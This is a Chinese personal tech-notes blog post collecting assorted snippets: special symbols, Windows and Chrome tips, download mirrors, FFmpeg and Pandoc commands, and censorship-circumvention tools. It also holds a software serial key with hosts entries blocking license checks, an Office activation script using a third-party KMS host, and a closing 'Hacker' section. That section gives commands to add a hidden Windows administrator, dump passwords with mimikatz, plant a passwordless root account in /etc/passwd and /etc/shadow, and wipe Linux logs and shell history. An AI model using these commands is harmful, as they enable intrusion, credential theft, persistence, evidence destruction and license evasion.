---
categories:
- Notes
date: 2016-02-08T21:08:50+08:00
title: Note
---

<!--more-->

> {{< image "/uploads/note.png" "Kratos" "1" "1" >}}

## 特殊符号
```java
特殊符号：
·⊙①◎Θ⊙●○¤㊣㈱＠の■□★☆◆◇◣◢◤◥▲△▼▽⊿◢▂▃▄▅▆▇█▉▊▋▌▍▎▏■□〓≡↑↓→←↘↙♀♂┇┅‖$@* amp;#※卍卐∞Ψ§∮№⌒＊◆◇◎●☉

标点符号：
．。，、；：？！ˉˇ¨`~々～‖∶＂＇｀｜·…—～-〃‘’“”〝〞〔〕〈〉《》「」『』〖〗【】（）［］｛｝︻︼﹄﹃

数学符号：
＋－×÷﹢﹣±／＝∥∠≌∽≦≧≒﹤﹥≈≡≠＝≤≥＜＞≮≯∷∶∫∮∝∞∧∨∑∏∪∩∈∵∴⊥∥∠⌒⊙√∟⊿㏒㏑％‰

单位符号：
㎎㎏㎜㎝㎞㎡㏄㏎㏑㏒㏕℡％‰℃℉°′″＄￡￥￠♂♀℅

数字序号：
①②③④⑤⑥⑦⑧⑨⑩㈠㈡㈢㈣㈤㈥㈦㈧㈨㈩№⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹ

希腊字母：
ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζνξοπρσηθικλμτυφχψω

占位符号：
一　一
一&#8195;一
一&#12288;一
https://en.m.wikipedia.org/wiki/Whitespace_character

✔️ ✔
✖️ ✖
❌
http://emojipedia.org/heavy-check-mark/
http://emojipedia.org/heavy-multiplication-x/
http://emojipedia.org/cross-mark/
```

## DOTA2
```java
启动：
-novid -console -high

控制台：
net_graph 1
dota_disable_range_finder 0
```

## 纯 UEFI 模式下转换 GPT 格式
```java
1. BIOS 设置中启动项关闭兼容模式
2. 插入 Win8 启动盘后，出现第一个"下一步"，按shift+f10调出命令对话框
3. 输入 diskpart
4. 输入 select  disk 0
5. 输入 clean
6. 输入 convert gpt

到这里就可以关闭命令对话框，按下一步进行正常的分区设置了，系统会自动分出三个区用于UEFI的启动。
```

## GPU & CPU 天梯表
```bash
http://malu.me/gpu/
http://malu.me/cpu/
```

## DNS
```bash
OpenDNS：
208.67.222.222
208.67.220.220
```

## IDM
```java
127.0.0.1 registeridm.com
127.0.0.1 www.registeridm.com
127.0.0.1 www.internetdownloadmanager.com

R2C1T-O0KQO-JAVU2-4MMYP
```

## 磁盘分区空间量设置
```java
100 G：
100 * 1024 + 615 = 103015
```

## 提取支付宝安全登录控件
```java
解压 aliedit.exe，找到以下 6 个文件：Alidcp.dll、aliedit.dll、npalidcp.dll、npaliedit.dll、npAlipaydhc.dll、npAliSecCtrl.dll。

IE内核浏览器：
需要这 4 个文件：Alidcp.dll、aliedit.dll、npAlipaydhc.dll、npAliSecCtrl.dll，64 位系统放置于 C:\WINDOWS\syswow64\aliedit 下。
以管理员身份运行如下命令：
regsvr32 C:\WINDOWS\syswow64\aliedit\alidcp.dll
regsvr32 C:\WINDOWS\syswow64\aliedit\aliedit.dll
regsvr32 C:\WINDOWS\syswow64\aliedit\npAlipaydhc.dll
regsvr32 C:\WINDOWS\syswow64\aliedit\npAliSecCtrl.dll

非IE内核浏览器：
需要这 3 个文件：npalidcp.dll、npaliedit.dll、npAliSecCtrl.dll，将这 3 个文件拷贝到浏览器的 Plugins 目录下即可。
```

## Git-GUI
```java
"D:\Download\PortableGit-MSysGit\bin\wish.exe D:/Download/PortableGit-MSysGit/libexec/git-core/git-gui"
```

## Clevo mirror
```bash
BIOS：
https://repo.palkeo.com/clevo-mirror/

DRIVERS：
https://www.sagernotebook.com/drivers.php?cat=580
```

## VPN
```bash
http://www.ipmana.com
http://vpn.wwdhz.com
https://code.google.com/p/goagent
https://wk.dxtl.net/dokuwiki/doku.php/start
https://www.imfreevpn.com/
```

## 无界
```bash
无界：
https://ultrasurf.us/index.html

自由：
https://dongtaiwang.com/loc/download.en.php

汇总：
https://forums.internetfreedom.org/index.php?wap2

Psiphon：
https://psiphon.ca/zh/download.html
https://psiphon3.com/zh/download.html

lantern：
https://getlantern.org
```

## 在线输入法（书签）
```bash
javascript:void(document.body.appendChild(document.createElement('script')).src='https://www.baidu.com/olime/bdime_open.js')
```

## Firefox
```bash
https://ftp.mozilla.org/pub/firefox/
https://download-origin.cdn.mozilla.net/pub/firefox/
https://download-installer.cdn.mozilla.net/pub/firefox/
```

## Pandoc
```bash
Markdown ➜ HTML：
pandoc -o 123.html 123.md

使用指定 CSS：
pandoc -o 123.html -c 123.css 123.md

生成独立 HTML：
pandoc -o 123.html -c 123.css --self-contained 123.md

----

DOCX ➜ PDF（需要 wkhtmltopdf）：
pandoc -o 123.pdf -t html5 -c 123.css 123.docx
```

## Server（Win）
```bash
Apache：
https://www.apachehaus.com/cgi-bin/download.plx

Nginx：
https://nginx.org/en/download.html

Caddy：
https://github.com/mholt/caddy/releases/latest

Serv-U：
https://support.solarwinds.com/Success_Center/Serv-U_Managed_File_Transfer_Serv-U_FTP_Server/release_notes
https://downloads.solarwinds.com/solarwinds/Release/SU/15.1.5/SU-FTP-Server-Windows-v15.1.5.zip
```

## 目录索引
```
Nginx：
nginx.exe -s reload
nginx.exe -s quit
----
http or server 中写入：
autoindex on;
autoindex_localtime on;
autoindex_exact_size off;
access_log off;

Caddy：
Caddy.exe -host 0.0.0.0 -port 80 "browse / ./1.txt" "gzip" "log stdout" "errors stdout" "header / -Server" "root ."
----
Browse Template：
https://github.com/mholt/caddy/blob/master/caddyhttp/browse/setup.go#L101
```

## 善用佳软
```bash
游览器：Chrome
播放器：MPC-BE
下载器：Aria2
清系统：CCleaner
解压缩：7-Zip
看图片：IrfanView
输入法：华宇拼音输入法
```

## Aria2 Curl Wget 代理下载
```html
Curl：
https://curl.haxx.se/download.html#Win64
curl -x 10.34.3.71:808 www.baidu.com

curl -Oku XhstormR:123456 "sftp://127.0.0.1/d/download/123.txt"

Wget：
https://eternallybored.org/misc/wget/current/wget64.exe
wget -e "http_proxy=10.34.3.71:808" www.baidu.com

Aria2：
https://github.com/aria2/aria2/releases/latest
aria2c --all-proxy="10.34.3.71:808" --max-connection-per-server=10 --min-split-size=5M http://www.baidu.com/

https://www.gnu.org/software/wget/manual/wget.html
```

## Xshell & Xftp
```bash
https://www.netsarang.com/download/down_live.html?productcode=2
https://www.netsarang.com/download/down_live.html?productcode=3

Xshell：保持活动状态 -> 字符串 -> 0 \n
```

## Video Download
```html
youtube-dl：（FFmpeg 自动合并）
https://yt-dl.org/downloads/latest/
youtube-dl.exe -F URL
youtube-dl.exe -f 137+140 --proxy socks5://127.0.0.1:1080 URL

you-get：
https://github.com/soimort/you-get/releases/latest

Bilibili：
http://www.bilibilijj.com/DownLoad/Cid/10143543

Andy's FLV Joiner：（FLV 合并）
http://www.videohelp.com/download/FLVJoin0.6.zip

yamdi：（FLV 关键帧）
https://sourceforge.net/projects/yamdi/files/
yamdi -i src.flv -o dst.flv

XML to ASS：（弹幕转字幕）
https://tiansh.github.io/us-danmaku/bilibili/
https://danmu2ass.codeplex.com/releases
```

## Chrome CSS
```css
正则排除网址：((?!localhost|xhstormr.tk).)*

a{text-decoration:none !important}
a:hover { text-decoration: underline !important;}
*:not([class*="icon"]):not(i){font-family: "Microsoft YaHei","Symbol" !important;}
```

## Chrome User Agent
```bash
iPhone：
--User-Agent="Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53"

Android：
--User-Agent="Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LYZ28E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2403.20 Mobile Safari/537.36"

Windows：
--User-Agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2403.20 Safari/537.36 Linux Nexus"
```

## Chrome HSTS
```html
chrome://net-internals/#hsts

强制忽略证书错误：badidea
```

## Chrome Screenshot
```html
F12 -> Ctrl+Shift+P -> full size screenshot
```

## Search
```bash
https://duckduckgo.com/?q=123

https://www.google.com/search?newwindow=1&q=123

https://encrypted.google.com/ncr
----
site:example.com filetype:pdf "电子书没有采用专有" -去除关键字
----
inurl:链接
intext:正文
intitle:标题
```

## Hosts
```bash
C:\Windows\System32\drivers\etc\
⇳
64.233.189.121 feeds.feedburner.com
64.233.189.121 www.repacks.org
64.233.189.121 www.draw.io
54.231.66.16 s3.amazonaws.com
209.99.20.16 dl.dumptruck.goldenfrog.com
151.101.128.133 blog.xhstormr.tk
151.101.128.133 assets-cdn.github.com
151.101.128.133 raw.githubusercontent.com
```

## Google（Mirrors）
```html
http://serve.netsh.org/pub/ipv4-hosts/
https://raw.githubusercontent.com/googlehosts/hosts/master/hosts-files/hosts
https://raw.githubusercontent.com/sy618/hosts/master/y

EXE：
https://en.m.wikipedia.org/wiki/Google_Chrome
https://api.shuax.com/tools/getchrome
https://repo.fdzh.org/chrome/exe/
-
https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html
https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Android/441086/
https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/441085/
https://commondatastorage.googleapis.com/chromium-browser-snapshots/Android/LAST_CHANGE
https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/LAST_CHANGE
-
type nul > "D:\Program Files\Chrome\User Data\SwReporter"

CRX：
http://crx.2333.me/
http://yurl.sinaapp.com/crx.php
http://chrome-extension-downloader.com/

APK：
https://apps.evozi.com/apk-downloader/
https://apkleecher.com/
https://m.apkpure.com/
https://www.apk4fun.com/
```

## SQL
```bash
SQLite：
https://www.sqlite.org/index.html
https://github.com/xerial/sqlite-jdbc
https://jcenter.bintray.com/org/xerial/sqlite-jdbc/
----
sqlite3.exe 123.db ".mode column" ".header on" "select * from user;" > 1.txt
----
compile 'org.xerial:sqlite-jdbc:+'

MySQL：
https://dev.mysql.com/downloads/mysql/
----
mysqld --initialize-insecure
mysqld
mysql -uroot -p123456

Oracle：
http://www.oracle.com/technetwork/database/features/instant-client/index.html
----
export ORACLE_HOME=/u01/oracle/product/11.2.0/db_1
export PATH=$PATH:$ORACLE_HOME/bin
----
sqlplus username/password@127.0.0.1:1521/cqsfjwdb

Navicat：
http://download3.navicat.com/download/navicat120_premium_cs_x64.exe
```

## Wget 递归下载
```bash
wget -m -k -E -np -c -N --no-if-modified-since -p -P ./123 https://java.sx/java/index.html
```

## Operating System（Mirrors）
```bash
MSDN：
https://msdn.itellyou.cn/
https://www.microsoft.com/zh-cn/software-download/windows10ISO
https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=56116
https://msdn.microsoft.com/zh-cn/library/ms123401.aspx
https://msdn.microsoft.com/zh-cn/subscriptions/downloads/
----
document.getElementById("DownloadsArea").style.display="";

Linux（CentOS）：
https://www.centos.org/download/
https://mirrors.cqu.edu.cn/
https://mirrors.tuna.tsinghua.edu.cn/
https://mirrors.ustc.edu.cn/
http://mirrors.hust.edu.cn/
http://mirror.bit.edu.cn/web/
http://mirrors.163.com/
http://mirrors.sohu.com/
http://mirrors.aliyun.com/
http://mirrors.yun-idc.com/

RHEL：
https://access.redhat.com/products/red-hat-enterprise-linux/
https://developers.redhat.com/auth/realms/rhd/account/

https://live.sysinternals.com/
https://docs.microsoft.com/en-us/sysinternals/downloads/

https://bellard.org/tcc/

https://frippery.org/files/busybox/busybox64.exe

https://www.wireshark.org/download.html

https://www.cs.princeton.edu/~bwk/btl.mirror/index.html

https://github.com/Aegisub/Aegisub/releases/latest

http://free.nchc.org.tw/tdf/libreoffice/stable/5.4.1/win/x86_64/LibreOffice_5.4.1_Win_x64.msi

https://cloud.bluestacks.com/api/getdownloadnow

https://mirrors.tuna.tsinghua.edu.cn/virtualbox/virtualbox-Win-latest.exe

https://mirrors.ustc.edu.cn/vim/pc/vim80w32.zip

https://mirrors.ustc.edu.cn/eclipse/technology/epp/downloads/release/oxygen/1a/eclipse-java-oxygen-1a-win32-x86_64.zip

https://mirrors.ustc.edu.cn/qtproject/official_releases/qtcreator/4.4/4.4.1/installer_source/windows_vs2015_64/qtcreator.7z

https://mirrors.ustc.edu.cn/gimp/stable/windows/gimp-2.8.22-setup.exe

https://mirrors.ustc.edu.cn/kde/stable/krita/3.3.0/krita-3.3.0-x64.zip

https://mirrors.ustc.edu.cn/rust-static/dist/rust-1.21.0-x86_64-pc-windows-gnu.msi

https://mirrors.ustc.edu.cn/golang/go1.9.2.windows-amd64.zip

https://mirrors.ustc.edu.cn/lineageos/full/
----
https://download.lineageos.org/

https://mirrors.ustc.edu.cn/apache/tika/tika-app-1.16.jar
----
java -jar tika-app-1.16.jar -h 123 > 123.html

https://mirrors.ustc.edu.cn/node/latest/node-v9.2.0-win-x64.7z
https://cdn.npm.taobao.org/primer-markdown/-/primer-markdown-3.7.3.tgz
https://npm.taobao.org/mirrors/
----
npm --registry=https://registry.npm.taobao.org install -g test

PSP：
https://www.ppsspp.org/downloads.html
https://github.com/hrydgard/ppsspp
http://buildbot.orphis.net/ppsspp/
----
模拟手柄：https://github.com/RetroPie/RetroPie-Setup/wiki/PSP-FuSa-gamepad

PS2：
http://pcsx2.net/download/releases/windows/category/40-windows.html
https://github.com/PCSX2/pcsx2
http://buildbot.orphis.net/pcsx2/

PS3：
https://rpcs3.net/download
https://github.com/RPCS3/rpcs3
https://ci.appveyor.com/project/rpcs3/rpcs3/branch/master/artifacts

N64：
http://www.pj64-emu.com/windows-downloads
https://github.com/project64/project64

Wii U：
http://cemu.info/index.html
```

## FFmpeg
```bash
ffmpeg.exe -i http://example.com/1.m3u8 -c copy 123.mkv
ffplay.exe "http://example.com/1.m3u8"

ffplay.exe -v -8 -t 0.5 -loop 3 -nodisp -autoexit 123.mp3

H.264：
ffmpeg.exe -i 123.gif -c:v libx264 -preset medium -crf 28 -c:a aac -b:a 128k 123.mp4
H.265：
ffmpeg.exe -i 123.gif -c:v libx265 -preset medium -crf 28 -c:a aac -b:a 128k 123.mp4
VP9：
ffmpeg.exe -i 123.gif -c:v libvpx-vp9 -crf 45 -b:v 0 -c:a libvorbis 123.webm
H.264 to RAW：
ffmpeg.exe -i 123.mp4 -vcodec copy -an -bsf:v h264_mp4toannexb 123.h264
Clip Video：
ffmpeg.exe -i 123.mp4 -ss 5.0 -t 3.0 1234.mp4

https://ffmpeg.zeranoe.com/builds/
```

## Win10 禁用 OneDrive、Defender 等组件
```bash
gpedit.msc -> 计算机配置 -> 管理模板 -> Windows 组件 -> OneDrive & Windows Defender

卸载 OneDrive：
taskkill /f /im OneDrive.exe
%SystemRoot%\SysWOW64\OneDriveSetup.exe /uninstall
rd "%UserProfile%\OneDrive" /Q /S
rd "%LocalAppData%\Microsoft\OneDrive" /Q /S
rd "%ProgramData%\Microsoft OneDrive" /Q /S
rd "C:\OneDriveTemp" /Q /S
REG Delete "HKEY_CLASSES_ROOT\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f
REG Delete "HKEY_CLASSES_ROOT\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f

禁用 Unistack 服务组：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDP* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OneSyncSvc* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UnistoreSvc* -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc* -> Start = 4
-
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc -> Start = 4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tiledatamodelsvc -> Start = 4

CMD 操作示例：
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc /v Start /t REG_DWORD /d 4 /f
```

## Win10 输入法
```
切换半全角：Shift+Space
切换简繁体：Ctrl+Shift+F
```

## Domain
```bash
注册：https://my.freenom.com/
解析：https://www.cloudxns.net/
解析：https://www.cloudflare.com/a
解析：https://my.incapsula.com/mysites
```

## ImageMagick
```html
magick.exe convert -size 1000 123.svg 123.png     svg ➜ png
magick.exe convert -density 300 123.pdf 123.png     pdf ➜ png
magick.exe convert -extent +0+10 -crop 0x2000 123.png 456.png     分割图片
magick.exe convert -transparent white -fuzz 25% 123.png 456.png     透明图片

https://www.imagemagick.org/script/download.php#windows
----
转换 PDF：https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/latest     将 gswin64c.exe 更名为 gs.exe
操作 PDF：https://github.com/coherentgraphics/cpdf-binaries
查看 PDF：https://mupdf.com/downloads/

https://pngquant.org/
http://advsys.net/ken/utils.htm
https://sourceforge.net/projects/optipng/files/OptiPNG/

https://tinypng.com/
http://m.2gei.com/bgremover/
https://imageoptim.com/mozjpeg

http://editor.method.ac/
http://127.0.0.1/draw/war/index.html?lang=zh&https=0&local=1&demo=1
```

## 回车和换行
```html
回车（CR）：\r
换行（LF）：\n

Unix：\n
Mac ：\r
Dos ：\r\n

FOR /R %G IN (*.md) DO (unix2dos.exe -q "%G")

http://www.efgh.com/software/unix2dos.htm
https://waterlan.home.xs4all.nl/dos2unix.html
```

## 代码格式化
```html
FOR /R "D:\Download\code" %%i IN (*) DO (uncrustify.exe -c 123.cfg --no-backup "%%i")

http://astyle.sourceforge.net/
https://github.com/uncrustify/uncrustify

http://ww4.sinaimg.cn/large/a15b4afegy1fkfjyuhmvlj203k03kaor
```

## 修改环境变量
```bash
set
echo %path%

临时生效：
set  path=%path%;D:\Download\123
永久生效：
setx path "%path%;D:\Download\123" /m

----

cls
pause
calc
SnippingTool
ping z.cn
date /t && time /t
fc /n /w 1.txt 2.txt
```

## WebX
```html
https://storage.googleapis.com/downloads.webmproject.org/releases/webm/index.html
https://storage.googleapis.com/downloads.webmproject.org/releases/webp/index.html
```

## Translation
```html
https://www.bing.com/translator/
https://translate.google.cn/m/translate

http://m.dict.cn/
https://dict.youdao.com/m
```

## Bilibili HTML5
```html
https://www.bilibili.com/blackboard/help.html#p
https://live.bilibili.com/help/#uh5
```

## SumatraPDF
```html
TextColor = #a9b7c6
BackgroundColor = #2b2b2b
SelectionColor = #b3d4fc

https://www.sumatrapdfreader.org/settings.html
```

## C
```html
C：
https://zh.m.wikipedia.org/zh-cn/C语言

https://en.wikibooks.org/wiki/C_Programming
https://code.google.com/archive/p/msys-cn/

http://zh.cppreference.com/w/c
http://www.cplusplus.com/reference/clibrary/

CMake：
https://cmake.org/Wiki/CMake_Useful_Variables

MFC：
https://msdn.microsoft.com/zh-cn/library/d06h2x6e.aspx

GCC：
https://gcc.gnu.org/onlinedocs/gcc/Option-Index.html

IDE：
https://www.jetbrains.com/clion/download/
https://sourceforge.net/projects/orwelldevcpp/

Templates：
https://svn.code.sf.net/p/codeblocks/code/trunk/src/templates/
https://sourceforge.net/p/orwelldevcpp/code/ci/master/tree/Templates/
https://git.eclipse.org/c/cdt/org.eclipse.cdt.git/plain/build/org.eclipse.cdt.managedbuilder.gnu.ui/templates/projecttemplates/
```

## C\#（.NET Core）
```html
dotnet new console -n hello && cd hello
-----
dotnet publish -c abc
dotnet hello.dll
-----
dotnet publish -c abc -r win-x64
hello.exe

Core：
https://www.microsoft.com/net/download/core
Framework：
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe

API：
https://docs.microsoft.com/zh-cn/dotnet/api/index?view=netframework-4.7
https://docs.microsoft.com/zh-cn/dotnet/api/system.math.sqrt?view=netframework-4.7
```

```cs
class Hello {
    public static void Main(string[] args) {
        System.Console.WriteLine("Hello World!");
        System.Console.ReadLine();
    }
}
```

## Office
```bash
多窗口切换：视图 -> 切换窗口
快捷键设置：选项 -> 自定义功能区 -> 键盘快捷方式 -> 视图选项卡 -> WindowList -> Alt+Shift+Q
```

### Excel
```bash
https://support.office.com/zh-cn/article/Excel-函数（按字母顺序）-b3944572-255d-4efb-bb96-c6d90033e188
https://support.office.com/zh-cn/article/面向-Windows-的-Excel-键盘快捷方式和功能键-1798d9d5-842a-42b8-9c99-9b7213f0040f
https://support.office.com/zh-cn/article/在相对引用、绝对引用和混合引用间切换-dfec08cd-ae65-4f56-839e-5f0d8d0baca9

F2     编辑
F4     切换引用类型
Ctrl+D     向下填充

拼接字符串：
="String"&A1&"String"
判断奇偶数：
=IF(MOD(A1,2),"奇数","偶数")
```

### Install
#### C2R（零售版）
```html
setup.exe /download 123.xml
setup.exe /configure 123.xml

https://www.microsoft.com/en-us/download/confirmation.aspx?id=49117
https://support.office.com/zh-cn/article/d3879f0d-766c-469c-9440-0a9a2a905ca8
https://support.microsoft.com/zh-cn/help/257757
-----
PS：4 天死磕的教训，软件编程方面少跟 **微软的系统组件** 打交道，特别是关于注册表、DCOM、Office 之类的。
```

```xml
123.xml
⇳
<Configuration>
    <Add SourcePath="D:\Download\Office\" OfficeClientEdition="32" Channel="Monthly">
        <Product ID="WordRetail">
            <Language ID="zh-cn"/>
        </Product>
        <Product ID="ExcelRetail">
            <Language ID="zh-cn"/>
        </Product>
    </Add>
    <Display Level="Full" AcceptEULA="TRUE"/>
    <Logging Level="Standard" Path="D:\Download\Office\"/>
</Configuration>
```

#### MSI（批量授权版）
```bash
http://blog.sina.com.cn/s/blog_17b2ea0820102x7ds.html

123.bat
⇳
FOR /R "%CD%\key" %%i IN (*.xrm-ms) DO (
CSCRIPT.exe //Nologo %Windir%\System32\slmgr.vbs /ilc "%%i"
)
CSCRIPT.exe //Nologo "%CD%\Office16\OSPP.vbs" /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99
CSCRIPT.exe //Nologo "%CD%\Office16\OSPP.vbs" /sethst:kms.shuax.com
CSCRIPT.exe //Nologo "%CD%\Office16\OSPP.vbs" /act
CSCRIPT.exe //Nologo "%CD%\Office16\OSPP.vbs" /dstatus

Office16\office.dat
⇳
http://ww4.sinaimg.cn/large/a15b4afegy1fk3opedx7sj203k03kt99
```

## Photoshop
```html
1. 仿制图章
2. 栅格化文字
3. 滤镜 -> 杂色 -> 添加杂色 -> 单色 30%
4. 滤镜 -> 模糊 -> 高斯模糊 -> 0.4
```

## Hacker
```bash
漏洞：
https://drops.tuisec.win/
https://paper.tuisec.win/

漏洞利用：Metasploit
https://windows.metasploit.com/

漏洞扫描：Nessus
https://www.tenable.com/products/nessus/select-your-operating-system

漏洞渗透：Burp Suite
https://portswigger.net/burp/freedownload

网络扫描：Nmap
https://nmap.org/download.html

SQL 注入：sqlmap
https://github.com/sqlmapproject/sqlmap/archive/master.zip

API 测试：Postman
https://www.getpostman.com/apps

Windows 用户提权：
cmd /c net user admin 123456 /add
cmd /c net localgroup Administrators admin /add
cmd /c net user admin /active:yes

Windows 密码：mimikatz
https://github.com/gentilkiwi/mimikatz
-----
mimikatz.exe "log 123.log" version hostname privilege::debug sekurlsa::logonpasswords exit

Linux：
1. 上传公钥
ssh-copy-id root@219.221.10.50
ssh root@219.221.10.50
2. 添加账号
echo "sqnuid:x:0:0::/:/bin/bash" >> /etc/passwd
echo "sqnuid::::::::" >> /etc/shadow

Linux 清空痕迹：
unset HISTFILE
echo > /var/run/utmp
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/secure
echo > /var/log/lastlog
echo > /root/.bash_history
```

```bash
set PYTHONHOME=D:\Download\python
set PATH=%PATH%;%PYTHONHOME%
set PYTHONPATH=%PYTHONHOME%\Lib

python sqlmap.py -r 123.log -p id --dbms=oracle --risk=3 --level=5 --tamper=space2comment --timeout=10 --code=200 --string="200 OK"
```
